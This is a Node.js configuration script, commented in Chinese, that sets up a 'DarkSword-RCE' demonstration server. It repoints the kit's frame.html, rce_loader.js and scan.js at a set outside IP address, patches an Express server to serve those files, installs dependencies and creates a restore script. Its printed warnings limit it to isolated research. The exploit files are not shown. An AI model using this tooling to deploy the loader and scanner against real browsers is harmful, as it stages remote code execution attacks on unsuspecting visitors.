const fs = require('fs');
const path = require('path');
const { execSync } = require('child_process');
const  PORT=8088
// 配置
const CONFIG = {
    serverHost: '127.0.0.1',
    serverPort: '8088',
    baseUrl: 'http://43.156.104.233'
};

const projectRoot = __dirname;
const darkSwordDir = path.join(projectRoot, 'DarkSword-RCE');
const serverDir = path.join(projectRoot, 'server');

// 颜色输出
const colors = {
    reset: '\x1b[0m',
    red: '\x1b[31m',
    green: '\x1b[32m',
    yellow: '\x1b[33m',
    blue: '\x1b[34m',
    cyan: '\x1b[36m'
};

function log(message, color = 'reset') {
    console.log(`${colors[color]}${message}${colors.reset}`);
}

function backupFile(filePath) {
    const backupPath = filePath + '.backup';
    if (!fs.existsSync(backupPath)) {
        fs.copyFileSync(filePath, backupPath);
        log(`✓ 已备份: ${path.basename(filePath)} -> ${path.basename(backupPath)}`, 'green');
    } else {
        log(`⚠ 备份已存在: ${path.basename(backupPath)}`, 'yellow');
    }
}

function modifyFrameHtml() {
    const filePath = path.join(darkSwordDir, 'frame.html');
    log(`\n处理: ${path.basename(filePath)}`, 'cyan');
    
    backupFile(filePath);
    
    let content = fs.readFileSync(filePath, 'utf8');
    
    // 替换服务器地址
    content = content.replace(
        /http:\/\/192\.168\.1\.27\/assets\/rce_loader\.js/g,
        `${CONFIG.baseUrl}/rce_loader.js`
    );
    
    fs.writeFileSync(filePath, content, 'utf8');
    log('✓ 已更新 frame.html', 'green');
}

function modifyRceLoader() {
    const filePath = path.join(darkSwordDir, 'rce_loader.js');
    log(`\n处理: ${path.basename(filePath)}`, 'cyan');
    
    backupFile(filePath);
    
    let content = fs.readFileSync(filePath, 'utf8');
    
    // 替换 localHost 变量
    content = content.replace(
        /var localHost = "http:\/\/43\.156\.104\.233\/"/g,
        `var localHost = "${CONFIG.baseUrl}/"`
    );
    
    // 替换 redirect 地址
    content = content.replace(
        /window\.location\.href = "http:\/\/43\.156\.104\.233\/404\.html"/g,
        `window.location.href = "${CONFIG.baseUrl}/404.html"`
    );
    
    fs.writeFileSync(filePath, content, 'utf8');
    log('✓ 已更新 rce_loader.js', 'green');
}

function modifyScanJs() {
    const filePath = path.join(darkSwordDir, 'scan.js');
    log(`\n处理: ${path.basename(filePath)}`, 'cyan');
    
    backupFile(filePath);
    
    let content = fs.readFileSync(filePath, 'utf8');
    
    // 替换 server_url
    content = content.replace(
        /const server_url="https:\/\/static\.cdncounter\.net"/g,
        `const server_url="${CONFIG.baseUrl}"`
    );
    
    fs.writeFileSync(filePath, content, 'utf8');
    log('✓ 已更新 scan.js', 'green');
}

function modifyServerJs() {
    const filePath = path.join(serverDir, 'server.js');
    log(`\n处理: ${path.basename(filePath)}`, 'cyan');
    
    backupFile(filePath);
    
    let content = fs.readFileSync(filePath, 'utf8');
    
    // 检查是否已经添加了静态文件服务
    if (content.includes('express.static')) {
        log('⚠ server.js 已包含静态文件服务配置', 'yellow');
        return;
    }
    
    // 在 const app = express(); 之后添加 path require
    content = content.replace(
        'const app = express();',
        `const path = require('path');\nconst app = express();`
    );
    
    // 在 CORS 配置后添加静态文件服务
    content = content.replace(
        'app.use(cors());',
        `app.use(cors());

// 静态文件服务 - DarkSword-RCE 目录
app.use(express.static(path.join(__dirname, '../DarkSword-RCE')));
console.log('静态文件服务已启动: DarkSword-RCE 目录');`
    );
    
    // 添加启动日志
    content = content.replace(
        "console.log(`服务器已启动：http://127.0.0.1:${PORT}`);",
        `console.log('\\n========================================');
console.log('DarkSword-RCE 演示服务器已启动');
console.log('访问地址: http://127.0.0.1:${PORT}/index.html');
console.log('========================================\\n');`
    );
    
    fs.writeFileSync(filePath, content, 'utf8');
    log('✓ 已更新 server.js', 'green');
}

function installDependencies() {
    log('\n安装服务器依赖...', 'cyan');
    
    try {
        process.chdir(serverDir);
        execSync('npm install', { stdio: 'inherit' });
        log('✓ 依赖安装完成', 'green');
    } catch (error) {
        log('✗ 依赖安装失败: ' + error.message, 'red');
        process.exit(1);
    }
}

function printInstructions() {
    log('\n' + '='.repeat(60), 'cyan');
    log('配置完成！', 'green');
    log('='.repeat(60), 'cyan');
    
    log('\n📋 下一步操作:', 'yellow');
    log('1. 启动服务器:', 'blue');
    log('   cd server');
    log('   node server.js');
    log('');
    log('2. 在浏览器中访问:', 'blue');
    log(`   ${CONFIG.baseUrl}/index.html`);
    log('');
    log('3. 观察服务器控制台日志', 'blue');
    log('');
    
    log('⚠️  安全提醒:', 'red');
    log('   - 仅在隔离的测试环境中运行');
    log('   - 不要在生产网络中使用');
    log('   - 遵守当地法律法规');
    log('   - 仅用于安全防御学习和研究');
    log('');
    
    log('📁 备份文件位置:', 'blue');
    log('   - DarkSword-RCE/frame.html.backup');
    log('   - DarkSword-RCE/rce_loader.js.backup');
    log('   - DarkSword-RCE/scan.js.backup');
    log('   - server/server.js.backup');
    log('');
    
    log('🔄 如需恢复原始配置，运行:', 'blue');
    log('   node restore-backup.js');
    log('');
}

// 主函数
function main() {
    log('\n🔧 DarkSword-RCE 演示环境配置工具', 'cyan');
    log('='.repeat(60), 'cyan');
    
    try {
        // 检查目录结构
        if (!fs.existsSync(darkSwordDir)) {
            throw new Error('DarkSword-RCE 目录不存在');
        }
        if (!fs.existsSync(serverDir)) {
            throw new Error('server 目录不存在');
        }
        
        // 执行配置
        modifyFrameHtml();
        modifyRceLoader();
        modifyScanJs();
        modifyServerJs();
        installDependencies();
        
        // 创建恢复脚本
        createRestoreScript();
        
        // 打印说明
        printInstructions();
        
    } catch (error) {
        log('\n✗ 配置失败: ' + error.message, 'red');
        process.exit(1);
    }
}

function createRestoreScript() {
    const restoreScript = `const fs = require('fs');
const path = require('path');

const files = [
    'DarkSword-RCE/frame.html',
    'DarkSword-RCE/rce_loader.js',
    'DarkSword-RCE/scan.js',
    'server/server.js'
];

console.log('🔄 恢复备份文件...\\n');

files.forEach(file => {
    const backupPath = file + '.backup';
    if (fs.existsSync(backupPath)) {
        fs.copyFileSync(backupPath, file);
        console.log('✓ 已恢复: ' + file);
    } else {
        console.log('⚠ 备份不存在: ' + backupPath);
    }
});

console.log('\\n✓ 恢复完成！');
`;
    
    const restorePath = path.join(projectRoot, 'restore-backup.js');
    fs.writeFileSync(restorePath, restoreScript, 'utf8');
    log('✓ 已创建恢复脚本: restore-backup.js', 'green');
}

// 运行
main();
